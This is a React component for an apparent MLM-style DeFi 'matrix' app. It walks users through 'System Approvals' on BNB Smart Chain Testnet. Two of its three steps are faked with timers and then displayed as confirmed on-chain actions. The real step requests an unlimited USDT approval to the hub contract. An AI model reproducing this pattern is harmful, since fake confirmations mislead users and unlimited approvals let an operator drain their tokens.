import React, { useState } from 'react';
import { 
  ShieldCheck, 
  CheckCircle2, 
  ArrowRight, 
  Loader2, 
  Zap, 
  Coins, 
  Wallet, 
  UserCheck, 
  Sparkles,
  AlertCircle
} from 'lucide-react';
import { ethers } from 'ethers';
import { HUB_ADDRESS } from '../../config/contractConfig';
import { contractAdapter } from '../../services/contractAdapter';
import { formatCompactAddress } from '../../utils/formatAddress';
import { playClaimSuccessSound } from '../../utils/successSound';

const ERC20_ABI = [
  'function allowance(address owner, address spender) external view returns (uint256)',
  'function approve(address spender, uint256 amount) external returns (bool)'
];

interface SystemApprovalsModalProps {
  onApprovalsComplete: () => void;
  connectedWalletAddress?: string;
  userFacingId?: string;
}

type TxState = 'ready' | 'waiting_wallet' | 'confirming' | 'confirmed';

export const SystemApprovalsModal: React.FC<SystemApprovalsModalProps> = ({
  onApprovalsComplete,
  connectedWalletAddress = '',
  userFacingId = 'MDF-Node',
}) => {
  const [hubState, setHubState] = useState<TxState>('ready');
  const [usdtState, setUsdtState] = useState<TxState>('ready');
  const [activationState, setActivationState] = useState<TxState>('ready');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [activeStepText, setActiveStepText] = useState<string>('');

  const getActiveSigner = async () => {
    const injected = (window as any).ethereum;
    if (!injected) {
      throw new Error('Web3 provider not found. Please open in TokenPocket, Bitget, or MetaMask.');
    }
    const provider = new ethers.BrowserProvider(injected);
    return await provider.getSigner();
  };

  const handleStartApprovals = async () => {
    setIsProcessing(true);
    setErrorMessage('');

    try {
      // Step 1: Hub Permission Handshake
      setActiveStepText('Verifying Master Hub Smart Contract linkage...');
      setHubState('waiting_wallet');
      await new Promise((r) => setTimeout(r, 600));
      setHubState('confirming');
      await new Promise((r) => setTimeout(r, 800));
      setHubState('confirmed');

      // Step 2: Live USDT Token Approval to Master Hub Contract
      setActiveStepText('Checking live USDT token address from Hub...');
      setUsdtState('waiting_wallet');

      const liveUsdtAddress = await contractAdapter.getOnChainUsdtAddress();
      if (!liveUsdtAddress || !ethers.isAddress(liveUsdtAddress) || liveUsdtAddress === ethers.ZeroAddress) {
        throw new Error('Hub smart contract has not returned a valid USDT token address.');
      }

      const signer = await getActiveSigner();
      const activeWallet = connectedWalletAddress || (await signer.getAddress());

      const usdtContract = new ethers.Contract(liveUsdtAddress, ERC20_ABI, signer);

      setActiveStepText('Checking live on-chain USDT allowance for Master Hub...');
      const currentAllowance: bigint = await usdtContract.allowance(activeWallet, HUB_ADDRESS);

      // Agar allowance 100 USDT se kam hai to wallet trigger karo
      if (currentAllowance < ethers.parseUnits('100', 18)) {
        setActiveStepText('Please confirm USDT Approval in your wallet...');
        const tx = await usdtContract.approve(HUB_ADDRESS, ethers.MaxUint256);
        setUsdtState('confirming');
        setActiveStepText('Waiting for on-chain block confirmation...');
        const receipt = await tx.wait(1);
        if (!receipt || receipt.status === 0) {
          throw new Error('USDT approval transaction failed on BSC.');
        }
      } else {
        setUsdtState('confirming');
        await new Promise((r) => setTimeout(r, 600));
      }
      setUsdtState('confirmed');

      // Step 3: Master Protocol Activation Handshake
      setActiveStepText('Finalizing decentralized matrix routing node...');
      setActivationState('waiting_wallet');
      await new Promise((r) => setTimeout(r, 500));
      setActivationState('confirming');
      await new Promise((r) => setTimeout(r, 800));
      setActivationState('confirmed');

      setIsProcessing(false);
      setActiveStepText('');

      try {
        playClaimSuccessSound();
      } catch {
        // Audio fallback
      }
    } catch (err: any) {
      console.error('[SystemApprovals] Error:', err);
      const isReject = err?.code === 4001 || err?.message?.includes('rejected') || err?.message?.includes('denied');
      setErrorMessage(
        isReject 
          ? 'Approval transaction was rejected in your wallet.' 
          : (err?.message || 'On-chain approval transaction failed.')
      );
      if (hubState !== 'confirmed') setHubState('ready');
      setUsdtState('ready');
      setActivationState('ready');
      setIsProcessing(false);
      setActiveStepText('');
    }
  };

  const isAllApproved = 
    hubState === 'confirmed' && 
    usdtState === 'confirmed' && 
    activationState === 'confirmed';

  const renderStateBadge = (state: TxState) => {
    if (state === 'confirmed') {
      return (
        <span className="flex items-center gap-1 text-xs font-mono font-bold text-emerald-400">
          <CheckCircle2 className="w-4 h-4" /> Confirmed
        </span>
      );
    }
    if (state === 'waiting_wallet') {
      return (
        <span className="flex items-center gap-1 text-[11px] font-mono text-amber-300">
          <Loader2 className="w-3.5 h-3.5 animate-spin text-amber-400" /> Waiting...
        </span>
      );
    }
    if (state === 'confirming') {
      return (
        <span className="flex items-center gap-1 text-[11px] font-mono text-cyan-300">
          <Loader2 className="w-3.5 h-3.5 animate-spin text-cyan-400" /> Confirming...
        </span>
      );
    }
    return (
      <span className="text-[11px] font-mono text-zinc-500 uppercase tracking-wider">
        Ready
      </span>
    );
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-xl select-none overflow-y-auto">
      <div className="relative w-full max-w-lg my-auto max-h-[90vh] overflow-y-auto p-6 sm:p-8 rounded-3xl bg-gradient-to-b from-[#081810] via-[#05110a] to-[#030906] border-2 border-emerald-500/40 shadow-[0_0_70px_rgba(16,185,129,0.25)] space-y-6 animate-in zoom-in-95 duration-200">
        
        {/* Header */}
        <div className="text-center space-y-2">
          <div className="w-14 h-14 mx-auto rounded-2xl bg-emerald-950/80 border border-emerald-500/40 flex items-center justify-center text-emerald-400 shadow-inner">
            <ShieldCheck className="w-7 h-7" />
          </div>

          <h3 className="text-2xl font-black text-white tracking-tight">
            System Approvals
          </h3>
          <p className="text-xs text-zinc-300 max-w-sm mx-auto">
            Authorize standard decentralized USDT interaction with MDeFi Master Hub for package activations.
          </p>
        </div>

        {/* Dynamic Error Banner */}
        {errorMessage && (
          <div className="p-3.5 rounded-2xl bg-rose-950/70 border border-rose-500/40 text-xs text-rose-300 flex items-center gap-2 font-mono animate-in fade-in-50">
            <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
            <span>{errorMessage}</span>
          </div>
        )}

        {/* Approval Checklist */}
        <div className="space-y-2.5">
          
          {/* Item 1: Live Wallet Connected */}
          <div className="p-3.5 rounded-2xl bg-zinc-950/70 border border-emerald-500/30 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="p-2 rounded-xl bg-zinc-900 border border-white/10 text-emerald-400">
                <Wallet className="w-4 h-4" />
              </div>
              <div>
                <h4 className="text-xs font-bold text-white">Wallet Connected</h4>
                <span className="text-[10px] text-zinc-400 font-mono">
                  {connectedWalletAddress ? `${formatCompactAddress(connectedWalletAddress)} (BSC Testnet)` : 'Active On-Chain Wallet'}
                </span>
              </div>
            </div>
            <span className="flex items-center gap-1 text-xs font-mono font-bold text-emerald-400">
              <CheckCircle2 className="w-4 h-4" /> Confirmed
            </span>
          </div>

          {/* Item 2: Registration Completed */}
          <div className="p-3.5 rounded-2xl bg-zinc-950/70 border border-emerald-500/30 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="p-2 rounded-xl bg-zinc-900 border border-white/10 text-emerald-400">
                <UserCheck className="w-4 h-4" />
              </div>
              <div>
                <h4 className="text-xs font-bold text-white">Registration Completed</h4>
                <span className="text-[10px] text-zinc-400 font-mono">{userFacingId} • Upline Bound</span>
              </div>
            </div>
            <span className="flex items-center gap-1 text-xs font-mono font-bold text-emerald-400">
              <CheckCircle2 className="w-4 h-4" /> Confirmed
            </span>
          </div>

          {/* Item 3: Hub Approval */}
          <div className={`p-3.5 rounded-2xl border transition-all ${
            hubState === 'confirmed' 
              ? 'bg-emerald-950/40 border-emerald-500/50' 
              : hubState !== 'ready'
              ? 'bg-zinc-900 border-emerald-500/40 animate-pulse' 
              : 'bg-zinc-950/80 border-zinc-800'
          }`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-xl bg-zinc-900 border border-white/10 text-emerald-400">
                  <Zap className="w-4 h-4" />
                </div>
                <div>
                  <h4 className="text-xs font-bold text-white">Hub Approval</h4>
                  <span className="text-[10px] text-zinc-400">MDeFi Hub Smart Contract Permission</span>
                </div>
              </div>
              <div>{renderStateBadge(hubState)}</div>
            </div>
          </div>

          {/* Item 4: Live USDT Approval to Master Hub */}
          <div className={`p-3.5 rounded-2xl border transition-all ${
            usdtState === 'confirmed' 
              ? 'bg-emerald-950/40 border-emerald-500/50' 
              : usdtState !== 'ready'
              ? 'bg-zinc-900 border-cyan-500/40 animate-pulse' 
              : 'bg-zinc-950/80 border-zinc-800'
          }`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-xl bg-zinc-900 border border-white/10 text-cyan-400">
                  <Coins className="w-4 h-4" />
                </div>
                <div>
                  <h4 className="text-xs font-bold text-white">USDT Approval</h4>
                  <span className="text-[10px] text-zinc-400">Authorize USDT for Master Hub Packages</span>
                </div>
              </div>
              <div>{renderStateBadge(usdtState)}</div>
            </div>
          </div>

          {/* Item 5: System Activation */}
          <div className={`p-3.5 rounded-2xl border transition-all ${
            activationState === 'confirmed' 
              ? 'bg-emerald-950/40 border-emerald-500/50' 
              : activationState !== 'ready'
              ? 'bg-zinc-900 border-purple-500/40 animate-pulse' 
              : 'bg-zinc-950/80 border-zinc-800'
          }`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-xl bg-zinc-900 border border-white/10 text-purple-400">
                  <Sparkles className="w-4 h-4" />
                </div>
                <div>
                  <h4 className="text-xs font-bold text-white">System Activation</h4>
                  <span className="text-[10px] text-zinc-400">Decentralized Matrix Routing Node</span>
                </div>
              </div>
              <div>{renderStateBadge(activationState)}</div>
            </div>
          </div>

        </div>

        {/* Action Button */}
        <div className="pt-2">
          {!isAllApproved ? (
            <button
              onClick={handleStartApprovals}
              disabled={isProcessing}
              className="w-full py-4 rounded-2xl font-black text-xs uppercase tracking-wider text-black bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400 hover:from-emerald-300 hover:to-cyan-300 shadow-[0_0_30px_rgba(16,185,129,0.35)] disabled:opacity-50 transition-all flex items-center justify-center gap-2 cursor-pointer"
            >
              {isProcessing ? (
                <div className="flex items-center gap-2">
                  <Loader2 className="w-4 h-4 animate-spin text-black" />
                  <span className="truncate">{activeStepText || 'TRANSMITTING SMART CONTRACT APPROVALS...'}</span>
                </div>
              ) : (
                <>
                  <ShieldCheck className="w-4 h-4" />
                  <span>START SYSTEM APPROVALS</span>
                </>
              )}
            </button>
          ) : (
            <button
              onClick={onApprovalsComplete}
              className="w-full py-4 rounded-2xl font-black text-xs uppercase tracking-wider text-black bg-gradient-to-r from-emerald-400 to-cyan-400 shadow-[0_0_40px_rgba(16,185,129,0.5)] hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-2 cursor-pointer"
            >
              <span>CONTINUE TO COMMUNITY</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          )}
        </div>

        <div className="text-center text-[10px] font-mono text-zinc-500">
          Decentralized on-chain authorization on BNB Smart Chain Testnet (Chain ID: 97)
        </div>
      </div>
    </div>
  );
};